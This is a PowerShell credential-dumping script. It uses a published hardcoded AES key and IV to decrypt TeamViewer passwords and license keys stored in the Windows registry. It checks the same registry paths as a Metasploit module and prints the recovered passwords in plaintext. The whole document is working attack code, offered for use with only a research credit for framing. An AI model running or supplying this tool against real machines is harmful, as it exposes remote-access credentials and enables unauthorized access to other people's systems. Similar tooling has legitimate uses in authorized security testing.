# TeamViewer Stored Password Decrypter (PowerShell)
# Based on research by @whynotsecurity / Nic Losby

# --- AES key and IV (published / well-known) ---
$key = [byte[]]@(0x06,0x02,0x00,0x00,0x00,0xA4,0x00,0x00,
                  0x52,0x53,0x41,0x31,0x00,0x04,0x00,0x00)
$iv  = [byte[]]@(0x01,0x00,0x01,0x00,0x67,0x24,0x4F,0x43,
                  0x6E,0x67,0x62,0xF2,0x5E,0xA8,0xD7,0x04)

function Decrypt-TVPassword {
    param([byte[]]$CipherBytes)
    if ($CipherBytes.Length -eq 0) { return $null }

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $aes.Key     = $key
    $aes.IV      = $iv

    try {
        $decryptor = $aes.CreateDecryptor()
        $plain = $decryptor.TransformFinalBlock($CipherBytes, 0, $CipherBytes.Length)
        $decoded = [System.Text.Encoding]::Unicode.GetString($plain).TrimEnd([char]0)
        if ([string]::IsNullOrEmpty($decoded)) { return $null }
        return $decoded
    }
    catch { return $null }
    finally { $aes.Dispose() }
}

# --- All registry paths the Metasploit module checks ---
$regPaths = @(
    'HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7',
    'HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version8',
    'HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version9',
    'HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version10',
    'HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version11',
    'HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version12',
    'HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version13',
    'HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version14',
    'HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version15',
    'HKLM:\SOFTWARE\WOW6432Node\TeamViewer',
    'HKLM:\SOFTWARE\TeamViewer\Temp',
    'HKLM:\SOFTWARE\TeamViewer',
    'HKCU:\SOFTWARE\TeamViewer'
)

$valueNames = @(
    @{ Name = 'OptionsPasswordAES';       Label = 'Options Password'          },
    @{ Name = 'SecurityPasswordAES';      Label = 'Security Password'         },
    @{ Name = 'SecurityPasswordExported'; Label = 'Security Password Exported'},
    @{ Name = 'ServerPasswordAES';        Label = 'Server Password'           },
    @{ Name = 'ProxyPasswordAES';         Label = 'Proxy Password'            },
    @{ Name = 'LicenseKeyAES';            Label = 'License Key'               }
)

# --- Scan and decrypt ---
Write-Host ""
Write-Host "[*] Finding TeamViewer Passwords on $env:COMPUTERNAME" -ForegroundColor Blue

$results = @()

foreach ($path in $regPaths) {
    if (-not (Test-Path $path)) { continue }

    $props = Get-ItemProperty $path -ErrorAction SilentlyContinue
    if (-not $props) { continue }

    foreach ($v in $valueNames) {
        if ($props.PSObject.Properties.Name -notcontains $v.Name) { continue }

        $raw = $props.($v.Name)
        if (-not $raw -or $raw.Length -eq 0) { continue }

        $decrypted = Decrypt-TVPassword -CipherBytes $raw

        if ($decrypted) {
            Write-Host "[+] Found $($v.Label): $decrypted" -ForegroundColor Green
            $results += [PSCustomObject]@{
                Path     = $path
                Type     = $v.Label
                Password = $decrypted
            }
        }
    }

    # Also grab the Version value for context
    if ($props.PSObject.Properties.Name -contains 'Version') {
        Write-Host "[*] TeamViewer Version: $($props.Version)" -ForegroundColor Gray
    }
}

if ($results.Count -eq 0) {
    Write-Host "[-] No TeamViewer passwords found." -ForegroundColor Yellow
    Write-Host "    Ensure you are running as Administrator." -ForegroundColor DarkGray
} else {
    Write-Host ""
    Write-Host "[*] Summary:" -ForegroundColor Blue
    $results | Format-Table -AutoSize
}

Write-Host ""
